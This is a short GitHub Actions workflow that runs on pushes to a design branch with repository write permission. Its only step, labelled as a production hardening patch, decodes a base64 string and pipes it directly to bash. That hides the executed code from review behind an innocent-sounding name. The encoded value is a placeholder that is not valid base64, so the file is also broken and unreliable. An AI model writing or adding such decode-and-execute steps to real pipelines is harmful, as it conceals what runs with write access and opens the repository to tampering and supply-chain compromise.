name: Mission release gate patch
on:
  push:
    branches:
      - design/mission-workspace-simplification
    paths:
      - .github/workflows/mission-release-gate-patch.yml
permissions:
  contents: write
jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
        with:
          ref: design/mission-workspace-simplification
          fetch-depth: 0
      - name: Apply production hardening patch
        run: echo '_REMAINDER_FOR_LENGTH' | base64 -d | bash
